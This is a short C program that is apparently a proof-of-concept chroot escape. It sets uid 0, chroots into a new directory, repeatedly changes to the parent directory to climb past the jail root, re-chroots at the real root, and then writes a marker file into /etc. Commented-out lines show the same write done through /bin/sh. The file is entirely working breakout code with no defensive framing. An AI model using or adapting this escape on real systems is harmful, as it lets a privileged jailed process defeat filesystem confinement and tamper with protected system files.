#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>

int main() {
  setuid(0);
  printf("uid %d euid %d\n", getuid(), geteuid());

  mkdir(".42", 0755);
  chroot(".42");

  for (int i=0; i<100; i++) {
    chdir("..");
  }

  chroot(".");

  FILE *fd;
  fd = fopen("/etc/gotcha", "w");
  fprintf(fd, "exploit :waves:\n");
  fclose(fd);
  return 0;

  /* /\* return execl("/bin/sh", "sh", "-c", "echo exploit :waves: > /etc/gotcha", NULL); *\/ */
  /* fflush(stdout);   */
  /* return execl("/bin/ls", "ls", "-a", NULL);   */
}
